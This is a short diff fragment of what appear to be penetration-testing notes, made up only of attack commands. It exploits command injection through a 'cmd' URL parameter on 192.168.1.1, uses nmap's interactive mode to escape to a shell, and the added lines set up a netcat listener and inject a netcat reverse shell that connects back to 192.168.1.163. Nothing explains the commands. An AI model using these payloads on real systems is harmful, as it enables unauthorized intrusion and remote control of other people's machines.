@@ -18,3 +18,8 @@ http://192.168.1.1/test?cmd=printf%20"!sh\n"%20|%20/usr/local/bin/nmap%20--inter
 !bash
 nmap --interactive
 !sh
+http://192.168.1.1/test?cmd=which nc
+
+
+nc -lvnp 5555
+http://192.168.1.1/test?cmd=nc%20192.168.1.163%205555%20-e%20/bin/sh
